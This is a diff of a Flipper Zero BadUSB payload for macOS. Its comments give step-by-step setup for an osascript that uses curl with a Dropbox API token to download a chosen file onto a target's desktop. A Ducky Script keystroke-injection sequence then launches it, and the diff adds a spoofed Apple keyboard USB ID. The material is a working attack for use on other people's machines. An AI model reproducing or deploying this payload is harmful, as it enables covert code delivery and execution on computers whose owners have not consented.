@@ -7,10 +7,10 @@ REM Version 1.0 MacOs
 REM Category: Execution 
 
 
-REM Copy and paste the osascript/code (lines 15-24) into the Script editor App on your MacOs
-REM Replace the "Your API Access token Here" placeholder with your actual Dropbox API token. line 13
-REM Replace the "File Name" placeholder with the name of the file you intend to download from dropbox
-REM Replace the "Dropbox File Path" placeholder with the path of the file you want to download from Dropbox
+REM Copy and paste the osascript/code (lines 19-28) into the Script editor App on your MacOs
+REM Replace the "Your API Access token Here" (line 20) placeholder with your actual Dropbox API token. 
+REM Replace the "File Name" (line 22) placeholder with the name of the file you intend to download from dropbox
+REM Replace the "Dropbox File Path" (line 21) placeholder with the path of the file you want to download from Dropbox
 REM Save this script below as a Droptod.scpt file (Use Script Editor) to your/your targets desktop.
 
 
@@ -29,9 +29,11 @@ do shell script "curl -X POST https://content.dropboxapi.com/2/files/download " 
 
 
 
-REM Final step is to save the below Ducky Script as a .txt file lines 31-44 (main Read.me has step by step directions)
+REM Final step is to save the below Ducky Script as a .txt file lines 36-50 (main Read.me has step by step directions)
 REM and put the .txt file on your BADUSB flipper zero APP to execute the osascript through the terminal.
 
+
+ID 05ac:021e Apple:Keyboard
 DELAY 500
 GUI SPACE
 DELAY 500
